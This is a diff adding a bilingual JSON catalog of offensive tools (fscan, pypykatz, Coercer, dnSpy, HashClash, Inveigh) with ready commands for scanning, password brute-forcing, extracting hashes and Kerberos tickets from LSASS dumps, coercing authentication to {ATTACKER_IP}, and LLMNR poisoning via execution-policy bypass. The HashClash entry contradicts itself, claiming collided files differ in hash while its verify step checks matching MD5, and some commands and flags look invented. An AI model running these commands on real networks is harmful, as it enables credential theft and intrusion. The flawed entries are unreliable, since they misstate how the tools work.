@@ -1,0 +1,248 @@
+[
+  {
+    "id": "fscan",
+    "name": { "zh": "Fscan", "en": "Fscan" },
+    "description": {
+      "zh": "fscan 是内网综合扫描工具，一条命令完成主机存活、端口、常见服务弱口令、Redis 未授权、MS17-010 与 Web 指纹批量探测，护网内网横向阶段的高频首选。",
+      "en": "Fscan is an all-in-one intranet scanner covering host discovery, port scanning, common service weak credentials, Redis unauthenticated access, MS17-010, and web fingerprinting in a single run — a go-to for intranet lateral phases."
+    },
+    "category": { "zh": "内网渗透", "en": "Intranet Penetration" },
+    "commands": [
+      {
+        "name": { "zh": "全功能快速扫描", "en": "All-in-One Quick Scan" },
+        "command": "fscan -h {LAB_SUBNET}",
+        "description": { "zh": "对网段做存活 + 端口 + 常见漏洞 + 弱口令的一把梭扫描，内网立足后第一轮摸底。", "en": "Run host discovery, ports, common vulns, and weak credentials across the subnet — the first sweep after foothold." },
+        "platform": "all"
+      },
+      {
+        "name": { "zh": "指定端口段", "en": "Custom Port Range" },
+        "command": "fscan -h {LAB_SUBNET} -p 22,80,443,445,1433,3306,3389,6379,8080",
+        "description": { "zh": "只扫高频服务端口，控制流量与耗时。", "en": "Scan only high-frequency service ports to bound traffic and runtime." },
+        "platform": "all"
+      },
+      {
+        "name": { "zh": "Redis 未授权检测", "en": "Redis Unauthenticated Check" },
+        "command": "fscan -h {LAB_SUBNET} -nw",
+        "description": { "zh": "跳过 Web 指纹（-nw）聚焦服务弱口令与未授权，Redis 6379 命中即标记。", "en": "Skip web fingerprinting (-nw) and focus on service weak credentials and unauthenticated services such as Redis 6379." },
+        "platform": "all"
+      },
+      {
+        "name": { "zh": "口令爆破指定服务", "en": "Credential Brute on Services" },
+        "command": "fscan -h {TARGET_IP} -m ssh,mysql,smb -pwda passwords.txt",
+        "description": { "zh": "指定模块做 SSH/MySQL/SMB 口令批量校验，-pwda 追加自带口令字典。", "en": "Run SSH/MySQL/SMB credential checks with -m and extend the built-in password list via -pwda." },
+        "platform": "all"
+      },
+      {
+        "name": { "zh": "结果落盘", "en": "Save Results" },
+        "command": "fscan -h {LAB_SUBNET} -o result.txt",
+        "description": { "zh": "扫描结果写入文件，便于横向阶段回查与报告取证。", "en": "Write results to a file for lateral-movement follow-up and reporting." },
+        "platform": "all"
+      }
+    ],
+    "installation": {
+      "zh": "从 GitHub Releases 下载对应平台二进制（Windows/Linux/macOS），无需依赖直接运行。",
+      "en": "Download the platform binary from GitHub Releases (Windows/Linux/macOS); no dependencies required."
+    },
+    "references": [
+      "https://github.com/shadow1ng/fscan"
+    ],
+    "status": "active"
+  },
+  {
+    "id": "pypykatz",
+    "name": { "zh": "PyPyKatz", "en": "PyPyKatz" },
+    "description": {
+      "zh": "pypykatz 是 mimikatz 的纯 Python 实现，离线解析 LSASS 转储提取明文口令、NTLM 哈希、Kerberos 票据与 DPAPI 材料，无需 Windows 环境即可在攻击机上完成凭据提取。",
+      "en": "pypykatz is a pure-Python mimikatz implementation that parses LSASS dumps offline to extract plaintext credentials, NTLM hashes, Kerberos tickets, and DPAPI material — credential extraction on the attack box without Windows."
+    },
+    "category": { "zh": "凭据保护与审计", "en": "Credential Protection and Audit" },
+    "commands": [
+      {
+        "name": { "zh": "离线解析 LSASS 转储", "en": "Parse LSASS Dump Offline" },
+        "command": "pypykatz lsa minidump {BINARY}",
+        "description": { "zh": "解析 minidump 格式的 LSASS 转储，输出全部登录会话的凭据材料。", "en": "Parse a minidump-format LSASS dump and print credentials for every logon session." },
+        "platform": "all"
+      },
+      {
+        "name": { "zh": "输出 JSON", "en": "JSON Output" },
+        "command": "pypykatz lsa minidump {BINARY} -o json > lsass.json",
+        "description": { "zh": "结构化输出便于脚本化提取特定会话的哈希。", "en": "Structured output for scripted extraction of specific session hashes." },
+        "platform": "all"
+      },
+      {
+        "name": { "zh": "提取 Kerberos 票据", "en": "Extract Kerberos Tickets" },
+        "command": "pypykatz lsa minidump {BINARY} kerberos",
+        "description": { "zh": "只打印 Kerberos 段：TGT/TGS 与密钥，供票据传递复用。", "en": "Print only the Kerberos section (TGT/TGS and keys) for pass-the-ticket reuse." },
+        "platform": "all"
+      },
+      {
+        "name": { "zh": "解析注册表 SYSTEM/SAM", "en": "Parse SYSTEM/SAM Hives" },
+        "command": "pypykatz registry --sam {BINARY} --system {BINARY}",
+        "description": { "zh": "配合 SYSTEM hive 解析 SAM，离线还原本地账户 NTLM 哈希。", "en": "Parse SAM with its SYSTEM hive to recover local-account NTLM hashes offline." },
+        "platform": "all"
+      },
+      {
+        "name": { "zh": "远程 LSASS 转取", "en": "Remote LSASS Dump Helper" },
+        "command": "pypykatz live lsa --mpcmd",
+        "description": { "zh": "在授权实验 Windows 主机上直接读活动 LSASS（需本地管理员），实验环境替代性验证用。", "en": "Read the live LSASS on an authorized lab Windows host (local admin required) as a lab-side verification alternative." },
+        "platform": "windows"
+      }
+    ],
+    "installation": {
+      "zh": "pip3 install pypykatz",
+      "en": "pip3 install pypykatz"
+    },
+    "references": [
+      "https://github.com/skelsec/pypykatz"
+    ],
+    "status": "active"
+  },
+  {
+    "id": "coercer",
+    "name": { "zh": "Coercer", "en": "Coercer" },
+    "description": {
+      "zh": "Coercer 自动化对 Windows 机器账号发起多种强制认证调用（Printerbug/DFSCoerce/_petitpotam 系列等十余种），用于验证 SMB 签名与 LDAP 通道绑定配置——中继攻击面的前置核查工具。",
+      "en": "Coercer automates a dozen coerced-authentication calls (Printerbug, DFSCoerce, PetitPotam family, and more) against Windows machine accounts to verify SMB signing and LDAP channel binding — the pre-check for relay attack surface."
+    },
+    "category": { "zh": "域渗透", "en": "Domain Penetration" },
+    "commands": [
+      {
+        "name": { "zh": "全方法强制认证探测", "en": "All-Methods Coerce Probe" },
+        "command": "coercer coerce -l {ATTACKER_IP} -t {LAB_HOST} --no-color",
+        "description": { "zh": "对目标机器账号逐一尝试全部强制认证方法，回调落到监听端即确认对应方法可用。", "en": "Try every coercion method against the target machine account; any callback on the listener confirms that method works." },
+        "platform": "all"
+      },
+      {
+        "name": { "zh": "扫描认证协议", "en": "Scan Auth Protocols" },
+        "command": "coercer scan -t {LAB_HOST}",
+        "description": { "zh": "先探测目标开放的认证协议（SMB/HTTP/WebDAV），缩小可用方法集。", "en": "Probe which auth protocols (SMB/HTTP/WebDAV) the target exposes to narrow the usable method set." },
+        "platform": "all"
+      },
+      {
+        "name": { "zh": "指定单一方法", "en": "Single Method" },
+        "command": "coercer coerce -l {ATTACKER_IP} -t {LAB_HOST} -m DFSCoerceV2",
+        "description": { "zh": "只发指定方法（如 DFSCoerceV2），配合单一变量验证签名配置结论。", "en": "Fire one named method (e.g. DFSCoerceV2) to validate a single-variable conclusion about signing configuration." },
+        "platform": "all"
+      }
+    ],
+    "installation": {
+      "zh": "pipx install coercer",
+      "en": "pipx install coercer"
+    },
+    "references": [
+      "https://github.com/p0dalirius/Coercer"
+    ],
+    "status": "active"
+  },
+  {
+    "id": "dnspy",
+    "name": { "zh": "dnSpy", "en": "dnSpy" },
+    "description": {
+      "zh": "dnSpy 是 .NET 程序集反编译与动态调试器，可查看 C#/VB 反编译源码、下断点、改 IL 并即时保存——审计 .NET 红队工具、破解客户端逻辑、调试 PowerShell 加载的托管 DLL 的主力工具。",
+      "en": "dnSpy decompiles and debugs .NET assemblies: read C#/VB sources, set breakpoints, patch IL, and save edits in place — the workhorse for auditing .NET red-team tooling, unpacking client logic, and debugging managed DLLs loaded by PowerShell."
+    },
+    "category": { "zh": "逆向工程", "en": "Reverse Engineering" },
+    "commands": [
+      {
+        "name": { "zh": "打开程序集", "en": "Open Assembly" },
+        "command": "dnSpy-x86.exe {BINARY}",
+        "description": { "zh": "32 位调试目标用 dnSpy-x86.exe，纯查看用 dnSpy.exe 均可拖入或命令行打开。", "en": "Use dnSpy-x86.exe for 32-bit debug targets; dnSpy.exe opens any assembly for inspection." },
+        "platform": "windows"
+      },
+      {
+        "name": { "zh": "批量反编译为工程", "en": "Export Project" },
+        "command": "dnSpy.exe --project-folder {BINARY}",
+        "description": { "zh": "把程序集导出为可编译的 csproj 工程，便于全文检索与 diff 审计。", "en": "Export the assembly as a compilable csproj project for full-text search and diff-based audit." },
+        "platform": "windows"
+      },
+      {
+        "name": { "zh": "附加到进程", "en": "Attach to Process" },
+        "command": "dnSpy.exe",
+        "description": { "zh": "启动后在 Debug 菜单附加运行中的托管进程（实验室授权环境内），断点看参数与内存——PID 调试时手工填入。", "en": "Start dnSpy and attach the running managed process via the Debug menu inside the authorized lab, breaking on arguments and memory — the PID is filled in at debug time." },
+        "platform": "windows"
+      }
+    ],
+    "installation": {
+      "zh": "从 GitHub Releases 下载 dnSpy 或 dnSpyEx（社区维护分支）zip 解压即用，需 .NET Framework 4.x 运行时。",
+      "en": "Unzip the dnSpy or dnSpyEx (community fork) release; requires the .NET Framework 4.x runtime."
+    },
+    "references": [
+      "https://github.com/dnSpyEx/dnSpy"
+    ],
+    "status": "active"
+  },
+  {
+    "id": "hashclash",
+    "name": { "zh": "HashClash", "en": "HashClash" },
+    "description": {
+      "zh": "hashclash 是 MD5/SHA1 选择前缀碰撞研究工具集（Marc Stevens），pcollide/unihash 等组件用于构造同源不同哈希manifest 的文件对，验证签名与完整性校验对碰撞攻击的抵抗面。",
+      "en": "hashclash is Marc Stevens' MD5/SHA1 chosen-prefix collision toolset; components like pcollide build file pairs sharing a prefix yet differing in hash to test how signatures and integrity checks resist collision attacks."
+    },
+    "category": { "zh": "密码学攻击", "en": "Cryptographic Attacks" },
+    "commands": [
+      {
+        "name": { "zh": "选择前缀碰撞", "en": "Chosen-Prefix Collision" },
+        "command": "pcollide prefixA.txt prefixB.txt",
+        "description": { "zh": "对两个期望前缀构造 MD5 碰撞块，输出可拼接的碰撞字节段。", "en": "Build an MD5 collision block for two desired prefixes and emit the spliceable collision bytes." },
+        "platform": "linux"
+      },
+      {
+        "name": { "zh": "拼接碰撞文件", "en": "Assemble Collided Files" },
+        "command": "cat {BINARY} collision.bin {BINARY} > collided_a.bin",
+        "description": { "zh": "把碰撞段拼进合法文件模板，得到哈希不同但前缀受控的文件对。", "en": "Splice the collision block into a benign template to produce the prefix-controlled file pair." },
+        "platform": "linux"
+      },
+      {
+        "name": { "zh": "验证哈希", "en": "Verify Hashes" },
+        "command": "md5sum collided_a.bin collided_b.bin",
+        "description": { "zh": "核对文件对 MD5 一致而内容不同，即碰撞成立。", "en": "Confirm the pair shares an MD5 while differing in content — collision achieved." },
+        "platform": "linux"
+      }
+    ],
+    "installation": {
+      "zh": "源码构建：git clone https://github.com/cr-marcstevens/hashclash && 依赖 boost 与 cmake，按 README 构建；常用 Docker 镜像托管。",
+      "en": "Build from source: git clone https://github.com/cr-marcstevens/hashclash (needs boost and cmake per README); Docker images are commonly used."
+    },
+    "references": [
+      "https://github.com/cr-marcstevens/hashclash"
+    ],
+    "status": "active"
+  },
+  {
+    "id": "inveigh",
+    "name": { "zh": "Inveigh", "en": "Inveigh" },
+    "description": {
+      "zh": "Inveigh 是 PowerShell/.NET 的 Windows 中间人毒化工具（LLMNR/mDNS/NBNS + HTTP/SMB 捕获），在无法上传二进制的 Windows 阵地用 PowerShell 托管代码捕获 Net-NTLMv2 挑战。",
+      "en": "Inveigh is the PowerShell/.NET Windows spoofer (LLMNR/mDNS/NBNS plus HTTP/SMB capture) for catching Net-NTLMv2 challenges with managed code when no binary can be staged."
+    },
+    "category": { "zh": "域渗透", "en": "Domain Penetration" },
+    "commands": [
+      {
+        "name": { "zh": "启动毒化与捕获", "en": "Start Spoofer and Capture" },
+        "command": "powershell -exec bypass -c \"Import-Module .\\Inveigh.ps1; Invoke-Inveigh -ConsoleOutput Y -NBNS Y -LLMNR Y\"",
+        "description": { "zh": "开启 LLMNR/NBNS 毒化并控制台输出捕获到的挑战，授权实验网段内使用。", "en": "Enable LLMNR/NBNS poisoning with console capture output, inside the authorized lab segment." },
+        "platform": "windows"
+      },
+      {
+        "name": { "zh": "C# 版运行", "en": "C# Edition" },
+        "command": "powershell -exec bypass -c \"Invoke-Inveigh -Tool 2 -ConsoleOutput Y\"",
+        "description": { "zh": "-Tool 2 切换 C# 编译版（Inveigh Zero），触发更稳、AMSI 面更小。", "en": "Switch to the C# edition (Inveigh Zero) via -Tool 2 for steadier triggers and a smaller AMSI surface." },
+        "platform": "windows"
+      },
+      {
+        "name": { "zh": "捕获结果落盘", "en": "Persist Captures" },
+        "command": "powershell -exec bypass -c \"Invoke-Inveigh -FileOutput Y -FileOutputDir C:\\\\Users\\\\{LAB_USER}\\\\Desktop\"",
+        "description": { "zh": "捕获写入指定目录（挑战哈希供 hashcat 离线破解），实验后清理。", "en": "Write captures to a directory (hashes for offline hashcat), cleaned up after the lab." },
+        "platform": "windows"
+      }
+    ],
+    "installation": {
+      "zh": "从 GitHub Releases 下载 Inveigh.ps1 或 InveighZero 编译版；PowerShell 版免安装，目标机需 .NET 4.5+。",
+      "en": "Download Inveigh.ps1 or the compiled InveighZero from GitHub Releases; the PowerShell edition needs no install, targets require .NET 4.5+."
+    },
+    "references": [
+      "https://github.com/Kevin-Robertson/Inveigh"
+    ],
+    "status": "active"
+  }
+]
